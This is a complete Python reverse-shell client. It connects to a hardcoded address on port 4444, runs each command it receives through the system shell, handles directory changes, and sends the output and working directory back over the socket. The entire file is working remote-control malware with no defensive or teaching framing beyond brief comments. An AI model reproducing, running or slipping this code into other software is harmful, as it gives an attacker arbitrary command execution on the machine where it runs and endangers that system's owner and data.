import socket
import os
import subprocess

socket_conn = socket.socket()
# Host should always be the server computer IP adress
host = '192.168.43.148'
port = 4444

socket_conn.connect((host, port))

while True:
    data = socket_conn.recv(1024)
    # checking if command is cd then taking path after cd
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        # Giving cmd and making shell true 
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        # Showing Current Working directory to user
        currentWD = os.getcwd() + "> "
        socket_conn.send(str.encode(output_str + currentWD))

        print(output_str)